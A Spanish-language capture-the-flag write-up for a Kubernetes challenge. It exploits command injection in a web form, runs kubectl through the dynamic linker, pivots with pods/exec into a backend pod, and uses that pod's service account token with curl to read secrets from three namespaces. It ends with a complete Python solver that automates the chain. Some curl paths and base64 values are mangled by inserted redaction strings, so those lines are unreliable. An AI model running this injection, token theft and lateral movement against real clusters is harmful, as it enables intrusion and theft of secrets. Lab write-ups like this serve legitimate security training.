# Writeup: Mini Kubernetes Challenge - Lateral Movement & Privilege Escalation

**Objetivo:** Capturar 3 flags escondidas en secretos de Kubernetes.
**Vector de entrada:** Una aplicación web vulnerable a Remote Code Execution (RCE).

---

## 1. Reconocimiento y Acceso Inicial

Al visitar el endpoint `http://77.42.16.86:30000/`, encontramos un formulario simple que ejecuta comandos.

### Confirmación de RCE
Probamos inyectar un comando básico para confirmar la vulnerabilidad y el usuario con el que corremos.

**Comando:**
```bash
curl "http://77.42.16.86:30000/?cmd=id;hostname"
```

**Resultado:**
```text
uid=0(root) gid=0(root) groups=0(root)
frontend-app-5889955bfd-rk7dx
```
Somos `root` dentro de un pod llamado `frontend-app`.

### Enumeración del Entorno
Buscamos herramientas útiles. Vimos un binario `kubectl` en `/app`, pero al intentar ejecutarlo fallaba.

**Comando:**
```bash
ls -la /app
./kubectl version
```

**Error:**
```text
/bin/sh: 1: ./kubectl: not found
```

**Solución (The Linker Trick):**
Este error suele ocurrir cuando el binario requiere librerías o un *loader* que no está en el path estándar. Invocamos el *dynamic linker* del sistema para forzar su ejecución.

**Comando funcional:**
```bash
/lib64/ld-linux-x86-64.so.2 /app/kubectl version
```

---

## 2. Evasión y Descubrimiento de Namespaces

Con `kubectl` funcionando, intentamos listar los secretos del pod actual para encontrar la primera flag.

**Intento:**
```bash
/lib64/ld-linux-x86-64.so.2 /app/kubectl get secrets
```
**Resultado:** `Error from server (Forbidden)`. El Service Account del frontend (`frontend-sa`) está restringido.

### Enumeración de Permisos
Revisamos qué *sí* podemos hacer.

**Comando:**
```bash
/lib64/ld-linux-x86-64.so.2 /app/kubectl auth can-i --list
```

**Descubrimiento Crítico:**
Aunque no podíamos leer secretos en `frontend`, teníamos permisos inusuales en otros namespaces:
1.  Podíamos listar namespaces.
2.  Teníamos permisos de `create` sobre `pods/exec` en el namespace `backend`.

### Listado de Namespaces
**Comando:**
```bash
/lib64/ld-linux-x86-64.so.2 /app/kubectl get ns
```
**Salida:**
*   `default`
*   `frontend`
*   `backend`  <-- Objetivo para movimiento lateral
*   `win-namespace` <-- Objetivo final

---

## 3. Movimiento Lateral (Pivoting)

Como tenemos permiso para ejecutar comandos (`exec`) en el namespace `backend`, usamos esto para saltar de un pod a otro.

### 1. Listar pods en backend
Primero necesitamos un nombre de pod válido en ese namespace.

**Comando:**
```bash
/lib64/ld-linux-x86-64.so.2 /app/kubectl get pods -n backend
```
**Salida:** Varios pods como `backend-api-746fcc985-2jrj5`.

### 2. Ejecución Remota (Inception)
Ejecutamos un shell dentro del pod de backend desde nuestro pod de frontend.

**Comando:**
```bash
/lib64/ld-linux-x86-64.so.2 /app/kubectl exec -n backend backend-api-746fcc985-2jrj5 -- id
```
**Resultado:** Éxito. Estamos ejecutando comandos dentro del namespace `backend`.

---

## 4. Escalada de Privilegios y Exfiltración

Una vez dentro del pod de `backend`, comprobamos sus herramientas. No tenía `kubectl`, pero sí tenía `curl`.

El Service Account montado en `/var/run/secrets/kubernetes.io/serviceaccount/token` dentro del pod de `backend` tenía permisos excesivos (Cluster Role o Role amplio) que le permitían leer secretos de **cualquier** namespace.

### Estrategia de Extracción
Usamos `curl` para consultar la API de Kubernetes directamente usando el token del pod de backend.

**Script de extracción (inyectado vía RCE):**

```bash
# 1. Obtener token del pod ACTUAL (frontend) - Inútil para leer, útil para autenticar el exec
# 2. Usar kubectl para hacer EXEC en backend
# 3. Dentro de backend, leer SU token y usar curl para pedir los secretos

# Comando final construido:
pod=$(/lib64/ld-linux-x86-64.so.2 /app/kubectl get pods -n backend -o jsonpath='{.items[0].metadata.name}')

/lib64/ld-linux-x86-64.so.2 /app/kubectl exec -n backend $pod -- sh -c '
  token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  
  # Flag 1 (Frontend)
  curl -k -s -H "Authorization: Bearer $token" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_SECRET_REDACTED_BY_ANTIGRAVITYflag1
  
  # Flag 2 (Backend)
  curl -k -s -H "Authorization: Bearer $token" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_SECRET_REDACTED_BY_ANTIGRAVITYlag2
  
  # Flag 3 (Win Namespace)
  curl -k -s -H "Authorization: Bearer $token" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/win-namespace/secrets/flag3-master-treasure
'
```

---

## 5. Flags Obtenidas

Los comandos anteriores devolvieron JSONs con los valores en base64. Al decodificarlos:

### Flag 1: Frontend Secret
*Base64:* `SECRET_REDACTED_BY_ANTIGRAVITYb21fZnJvbnRlbmR9`
**Flag:** `RE:CTF{initial_booty_stolen_from_frontend}`

### Flag 2: Backend Secret
*Base64:* `SECRET_REDACTED_BY_ANTIGRAVITYX3N1Y2Nlc3N9`
**Flag:** `RE:CTF{lateral_move_to_backend_success}`

### Flag 3: Win Namespace Secret
*Base64:* `SECRET_REDACTED_BY_ANTIGRAVITYYWxtb3N0X2NsdXN0ZXJfYWRtaW59`
**Flag:** `RE:CTF{entire_fleet_conquered_almost_cluster_admin}`

---

## Script "Solver" Automático (Python)

Este script se ejecuta desde tu máquina local y hace todo el trabajo sucio contra la URL del reto.

```python
import requests
import re
import base64

TARGET = "http://77.42.16.86:30000/"

def run_cmd(cmd):
    try:
        r = requests.get(TARGET, params={'cmd': cmd}, timeout=10)
        # Limpiar output HTML
        match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
        if match:
            return match.group(1).strip()
    except Exception as e:
        print(f"Error: {e}")
    return ""

print("[*] Iniciando explotación...")

# 1. Configurar el comando kubectl con el linker
kubectl = "/lib64/ld-linux-x86-64.so.2 /app/kubectl"

# 2. Obtener un pod del namespace backend
print("[*] Obteniendo nombre de pod en namespace 'backend'...")
cmd_get_pod = f"{kubectl} get pods -n backend -o jsonpath='{{.items[0].metadata.name}}'"
backend_pod = run_cmd(cmd_get_pod)

if not backend_pod or "Error" in backend_pod:
    print("[-] No se pudo obtener el pod de backend. ¿Funciona kubectl?")
    exit()

print(f"[+] Pod objetivo para pivotar: {backend_pod}")

# 3. Definir los objetivos (Namespace, Nombre del Secreto)
targets = [
    ("frontend", "flag1"),
    ("backend", "flag2"),
    ("win-namespace", "flag3-master-treasure")
]

# 4. Inyección: Exec en backend -> Leer Token -> Curl API
print("[*] Extrayendo secretos mediante pivoting...")

for ns, secret_name in targets:
    # Este comando se ejecuta DENTRO del pod de backend
    # Se usa python dentro del pod para parsear el JSON y decodificar el B64 limpiamente
    inner_cmd = (
        f"token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); "
        f"curl -k -s -H \"Authorization: Bearer $token\" "
        f"https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/{ns}/secrets/{secret_name}"
    )
    
    # Comando completo inyectado en el frontend
    full_cmd = f"{kubectl} exec -n backend {backend_pod} -- sh -c '{inner_cmd}'"
    
    response = run_cmd(full_cmd)
    
    # Búsqueda sucia del base64 en la respuesta JSON cruda
    try:
        # El formato suele ser "flag": "BASE64..."
        import json
        data = json.loads(response)
        b64_flag = data['data']['flag']
        flag = base64.b64decode(b64_flag).decode('utf-8')
        print(f"[+] {ns.upper()} FLAG: {flag}")
    except:
        print(f"[-] Error parseando flag para {ns}. Respuesta cruda:\n{response}")

print("[*] Misión Cumplida.")
```
